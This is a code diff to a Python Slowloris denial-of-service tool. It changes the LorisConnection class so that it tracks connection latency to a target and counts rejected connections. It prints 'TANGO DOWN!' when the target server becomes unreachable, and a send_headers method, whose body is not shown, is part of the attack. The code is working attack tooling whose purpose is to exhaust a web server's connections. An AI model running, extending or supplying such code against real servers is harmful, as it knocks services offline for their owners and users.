@@ -2,23 +2,41 @@
 
 import random
 import socket
+from datetime import datetime
 
 class LorisConnection:
     """SlowLoris connection."""
 
-    def __init__(self, host, port):
-        self.host = host
-        self.port = port
+    def __init__(self, target, first_connection=False):
+        self.target = target
         self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.socket.settimeout(5)
         try:
             # TODO: Add SSL support
-            self.socket.connect((self.host, self.port))
+            start_time = datetime.now()
+            self.socket.connect((target.host, target.port))
             self.socket.settimeout(None)
+            if not first_connection:
+                latency = (datetime.now() - start_time).total_seconds() * 1000.0
+                if len(target.latest_latency_list) < 10:
+                    target.latest_latency_list.append(latency)
+                else:
+                    target.latest_latency_list.pop(0)
+                    target.latest_latency_list.insert(0, latency)
             self.connected = True
-        except(TimeoutError, socket.timeout):
+        except socket.timeout:
             self.connected = False
-            print("TANGO DOWN! (host unreachable)")
+            # Keep track of rejected connections
+            if first_connection:
+                target.rejected_initial_connections += 1
+            else:
+                target.rejected_connections += 1
+            # Report first initial rejection to the user
+            if first_connection and target.rejected_initial_connections == 1:
+                print("[{}] New connections are getting rejected.".format(target.host))
+            # Report rejected reconnection to the user
+            if not first_connection:
+                print("[{}] TANGO DOWN! Target unreachable.".format(target.host))
 
     def is_connected(self):
         """Tests if the connection has been established."""
@@ -26,7 +44,11 @@ class LorisConnection:
 
     def close(self):
         """Closes the connection."""
-        self.socket.close()
+        try:
+            self.socket.shutdown(1)
+            self.socket.close()
+        except:
+            pass
 
     def send_headers(self, uagent):
         """Sends headers."""
